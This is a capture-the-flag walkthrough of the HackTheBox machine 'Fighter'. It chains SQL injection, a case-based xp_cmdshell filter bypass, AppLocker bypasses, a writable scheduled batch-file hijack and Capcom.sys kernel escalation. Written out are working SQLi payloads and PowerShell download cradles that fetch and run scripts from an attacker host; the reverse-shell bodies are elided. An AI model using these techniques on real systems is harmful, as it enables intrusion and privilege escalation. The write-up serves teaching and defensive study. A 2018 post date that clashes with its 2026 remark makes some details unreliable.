---
layout: post
title: "The Driver Wore a Game's Name"
subtitle: "HTB Fighter, where a login form runs your SQL, a fan-made cheat driver hands you the kernel, and AppLocker only ever guarded the front door"
date: 2018-10-13 12:00:00 +0000
description: "Fighter is a login form that runs your SQL, an allow-list you walk around instead of through, and a signed game-cheat driver that rents you the kernel."
image: /assets/og/the-driver-wore-a-games-name.png
tags: [hackthebox, writeup]
---

Fighter is named after a game, and the punchline is that the game came with a kernel driver. Street Fighter V once shipped a signed Windows driver that let anyone with a handle to it run code in ring zero, and this box mounts that fiasco like a trophy at the end of a long hallway. To reach the hallway you start at a login page that does not check your password so much as paste your typing into a database query, climb that into command execution despite a word filter and an application allow-list both trying to stop you, hijack a scheduled batch file someone left world-writable, and only then meet the famous driver. It is rated Insane, and it earns it not with one impossible move but with four or five fiddly ones stacked back to back, each one a small lesson in a line of defense that looked solid and was not.

```
        S T R E E T   F I G H T E R   C L U B
        =====================================
        login.asp   "type your name and password"
            |        (it types them into a SQL query)
            v
        stacked SQLi  ->  xp_cmDshElL  (mixed case, past the filter)
            |
            v
        AppLocker says no.  the 32-bit powershell says yes.
            |
            v
        a .bat anyone can edit, run by someone better than you
            |
            v
        Capcom.sys  --  a game's driver, lent to the kernel
                                            拳
```

## 0x01 · one port, one club

The scan is almost rude in its brevity. A single TCP port answers.

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft-IIS/8.5
```

IIS 8.5 dates the host to Windows Server 2012 R2, a machine already middle-aged when the box went live. The site calls itself the Street Fighter Club and points at a domain, `streetfighterclub.htb`. Whenever a box hands you a hostname, it is also hinting that there are more names where that came from. A round of vhost fuzzing with `wfuzz`, throwing candidate subdomains into the `Host` header, turns up `members.streetfighterclub.htb`, which answers with a curt 403. A locked door is still a door. You only need to find the right room behind it.

```
$ wfuzz -u http://10.10.10.72/ -H "Host: FUZZ.streetfighterclub.htb" \
    -w subdomains.txt --hw 0
000000123:  403  ...  "members"
```

A `feroxbuster` sweep of the members vhost, with `-x asp,aspx,html`, finds an `/old/` directory still standing where it should have been demolished. Inside sit three classic ASP files: `login.asp`, the form itself; `verify.asp`, the script that processes the POST; and `welcome.asp`, which just bounces you back to the login. The word `old` in a path is a confession. It means a newer thing replaced this, and nobody turned the old thing off.

## 0x02 · the form that types for you

The login posts three fields, and one of them is the tell: a `logintype` parameter carrying a number. Flip `logintype=2` to `logintype=1-- -` and the server's reaction changes from a 500 error to a 302 redirect. That swing, from "I crashed" to "I am happy," is the signature of SQL injection. The double-dash and trailing space comment out the rest of the query, and the database stops choking. Picture a clerk who reads your form aloud to the back office word for word. Most people write a name in the name box. You write a name, then a period, then a brand new sentence of instructions, and the clerk reads all of it to the office in the same flat voice. The office cannot hear your punctuation. It just follows along.

From there it is a column-counting exercise. A `UNION SELECT 1,2,3,4,5,6-- -` proves a six-column result, and the value you plant in column five comes back to you in an `Email` cookie, which becomes your readout window. Through that window the database introduces itself.

```
logintype=1 UNION SELECT 1,2,3,4,user(),6-- -      -> dbo
logintype=1 UNION SELECT 1,2,3,4,@@version,6-- -   -> Microsoft SQL Server 2014
```

`dbo` is the database owner, which on MSSQL is most of the way to administrator. That matters for the next move, because the owner is allowed to wake up the part of SQL Server that talks to the operating system.

## 0x03 · the filter that only read lowercase

MSSQL has a stored procedure called `xp_cmdshell` that runs whatever you give it as a Windows command. It is the most direct line from "I can query your database" to "I can run programs on your server." So of course something is watching for it. Type the name straight and a filter swats the request away. The filter, though, was written by someone who forgot that SQL keywords do not care about capitalization while their crude string match very much does. Spell it `xp_cmDshElL` and the filter, scanning for an exact lowercase string, sees nothing it recognizes while SQL Server understands it perfectly.

Think of it like a bouncer with a list of banned names who only checks for them in all-lowercase handwriting. Write your banned name in a jumble of caps and he waves you through, because he was matching ink, not meaning. Prove the execution with a ping you can hear on your own wire.

```
3;execute xp_cmDshElL 'ping 10.10.14.4'-- -
```

That leading `3;` stacks a second statement onto the first, which is why this is called stacked injection. Start a `tcpdump` for ICMP and the echo requests arrive, knocking from inside the box. The query window is now a command line.

## 0x04 · applocker, and the door beside it

Command execution is not a shell yet, and the first attempt to upgrade it hits a wall named AppLocker. AppLocker is Windows' application allow-list. Instead of naming the programs you may not run, it names the few you may, and slams the rest. The standard 64-bit PowerShell is on the forbidden side. This is where the box rewards someone who knows the operating system has more than one of everything. There is a second, 32-bit PowerShell living in a differently named folder, and the allow-list rules never mentioned it.

```
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
```

Picture a club with a strict guest list at the main entrance, and a service door around the side that nobody bothered to add to the list. Same building, same dance floor, but the bouncer at the front was the only bouncer. AppLocker did not fail. It simply guarded the doors someone remembered to point it at, and `SysWOW64` was not one of them. There are other side doors on this box too, each a known allow-list bypass: `MSBuild.exe` compiling inline C# from an XML project file, an executable uploaded with no `.exe` extension to dodge a name filter, and the perennially writable, perennially whitelisted `C:\Windows\System32\spool\drivers\color\`. Any of them gets code running. Through the 32-bit shell, a download cradle pulls a script and runs it in memory.

```
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe "iex(new-object net.webclient).downloadstring('http://10.10.14.4/iceberg.ps1')"
```

Inside `iceberg.ps1` is the payload you would rather not paste in full, a `[ PowerShell reverse shell calling back to 10.10.14.4 on 443 ]`. A listener catches it, and the shell lands as `fighter\sqlserv`, the service account SQL Server runs under. First footing, by way of two filters that both only watched one face of the thing they feared.

## 0x05 · a batch file anyone could edit

`sqlserv` is not the goal. Poking at the filesystem turns up a small bomb in another user's home: `C:\Users\decoder\clean.bat`. The file is owned by `decoder`, who is clearly more privileged, and a scheduled task runs it on a timer as that user. But the permissions on the file are wide open. You can write to it. A script that runs as someone better than you, that you are allowed to rewrite, is not a script. It is a loaded gun pointed at whoever pulls its trigger, and the trigger here is a clock.

First empty the file with the old copy-to-NUL trick, which truncates without needing a real source.

```
cmd /c copy /y NUL clean.bat
```

Then append a single line that fetches and runs your next stage. When the scheduled task fires, `decoder` runs your line for you.

```
cmd /c "echo powershell iex(new-object net.webclient).downloadstring('http://10.10.14.4/iceberg2.ps1') >> clean.bat"
```

`iceberg2.ps1` carries another `[ PowerShell reverse shell back to 10.10.14.4 on 443 ]`, and within a cycle of the timer the shell comes back wearing `decoder`'s name. There is a parallel route here for the impatient: `sqlserv` holds `SeImpersonate`, the privilege that JuicyPotato was built to abuse, coercing a privileged service to authenticate to you and stealing its token. Fighter is, in fact, the box that gave JuicyPotato its first public outing. Either way, you climb one rung by abusing a thing the system trusted to run on schedule.

## 0x06 · the driver that came with the game

Now the trophy at the end of the hall. A driver query, filtered to ignore the normal system drivers, surfaces one oddball loaded straight from the Windows root.

```
driverquery /v | findstr /iv "system32\\drivers"
Capcom   Capcom.sys   Running   C:\Windows\Capcom.sys
```

`Capcom.sys` is real, and its story is almost too on the nose for a box called Fighter. Capcom shipped this driver with Street Fighter V's anti-cheat. It was signed by a legitimate vendor, so Windows loads it without complaint, and it exposes a control interface (an IOCTL) that does something no driver should ever do: it takes a function pointer from user space and calls it with kernel privileges, after briefly switching off a CPU protection meant to stop exactly that. In other words, the driver volunteers to run your code in the kernel and asks for nothing in return.

Think of it like a museum that hires an armored truck, gives the driver a master key to every vault, and then lets any visitor phone the truck and tell it where to go. The truck is bonded, insured, completely legitimate. That is the whole problem. Its credentials are real, so the guards wave it through while it does exactly what the caller on the phone says. A signed driver is a borrowed badge that the operating system never thinks to question.

FuzzySecurity's PowerShell module wraps the ugly mechanics. Load it through the same in-memory cradle and call its elevation function.

```
iex(new-object net.webclient).downloadstring('http://10.10.14.4/capcom-all.ps1')
capcom-elevatepid
PS C:\> whoami
nt authority\system
```

The kernel ran your code because a game's anti-cheat asked it to, years ago, on your behalf.

```
C:\> type C:\Users\decoder\Desktop\user.txt
████████████████████████████████
C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

The root flag has one last joke. It is locked inside a `root.exe` on the desktop that wants a password, and the matching `checkdll.dll` XORs every byte of its check string with the key `9`. Drop both into Ghidra, undo the XOR, and the password falls out as `OdioLaFeta`. Run `root.exe OdioLaFeta` and it prints the flag. Even the prize was a cheap cipher dressed as a lock.

## 0x07 · the honest caveat

It is easy to read Fighter as a museum of old mistakes, and the specific pieces are old. Nobody is shipping `Capcom.sys` in 2026, the patched SQL filter is trivial, and AppLocker has hardened since. But every link in this chain is a live bug class wearing a period costume. The SQL injection is the oldest confession there is, a program that could not tell your data from its instructions. The mixed-case `xp_cmDshElL` is every allow-list and deny-list that matches strings instead of meaning, defeated the moment an attacker changes the spelling without changing the sense. The 32-bit PowerShell and the color directory are AppLocker doing precisely what it was told, which was less than someone assumed. The world-writable `clean.bat` is a permission nobody re-read after they set it. None of these got fixed by a single patch, because none of them was really a missing patch.

And the driver is the one that should keep an architect up at night, because it broke nothing and exploited nothing in the usual sense. The signature was valid. The load was permitted. The trust the operating system placed in a signed kernel driver was the entire vulnerability, and that same trust is the model that loads your graphics card driver and your antivirus right now. A bonded truck with a master key is wonderful until anyone can phone it. Code signing tells you who built a thing. It does not tell you the thing is safe, and Fighter is a long, patient demonstration of the gap between those two promises.

## 0x08 · outro

```
the form typed your sentence into its own mouth.
the filter only knew the word in lowercase.
the allow-list guarded one door of two.
the clock ran a file you were allowed to rewrite.
and the kernel trusted a badge a game had signed.

five locks, none of them broken. each one was the wrong shape
for the hand that opened it.

read the trust, not the signature. wear black.

                                                            EOF
```

---

*HTB: Fighter, retired 25 Apr 2018 (date taken from the write-up publish date; treat as approximate). An Insane Windows box that is really a lecture on misplaced trust, ending at the signed game driver that gave JuicyPotato its name. The driver still loads in a lab and nowhere you don't own.*